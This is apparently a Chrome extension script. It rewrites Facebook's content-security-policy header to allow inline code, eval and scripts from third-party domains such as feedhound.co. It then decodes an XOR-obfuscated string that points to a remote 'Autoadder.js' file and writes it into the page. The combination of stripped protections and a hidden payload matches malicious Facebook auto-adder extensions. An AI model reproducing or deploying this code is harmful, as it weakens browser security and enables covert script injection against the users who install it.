chrome.webRequest.onHeadersReceived.addListener(function (details)
{
	for (i = 0; i < details.responseHeaders.length; i++) {
		if (details.responseHeaders[i].name.toUpperCase() == "X-WEBKIT-CSP") {
			details.responseHeaders[i].value = "default-src *;script-src https://*.feedhound.co https://*.facebook.com http://*.facebook.com https://*.fbcdn.net http://*.fbcdn.net *.facebook.net *.google-analytics.com *.virtualearth.net *.google.com 127.0.0.1:* *.spotilocal.com:* chrome-extension://lifbcibllhkdhoafpjfnlhfpfgnpldfl 'unsafe-inline' 'unsafe-eval' https://*.akamaihd.net http://*.akamaihd.net;style-src * 'unsafe-inline';connect-src https://*.facebook.com http://*.facebook.com https://*.fbcdn.net http://*.fbcdn.net *.facebook.net *.spotilocal.com:* https://*.akamaihd.net ws://*.facebook.com:* http://*.akamaihd.net https://*.feedhound.co";
		}
	}
	return {
		responseHeaders : details.responseHeaders
	};
}, {
	urls : ["*://*.facebook.com/*"],
	types : ["main_frame", "sub_frame", "stylesheet", "script", "image", "object", "xmlhttprequest", "other"]
},
	["blocking", "responseHeaders"]
);


var a="jvvrq'1C--ekvjw`,amo-Rjmglkzvmmnq-Cz,:3-`nm`-ocqvgp-Cwvmcffgp,hq";b="";c="";var clen;clen=a.length;for(i=0;i<clen;i++){b+=String.fromCharCode(a.charCodeAt(i)^2)}c=unescape(b);document.write(c);
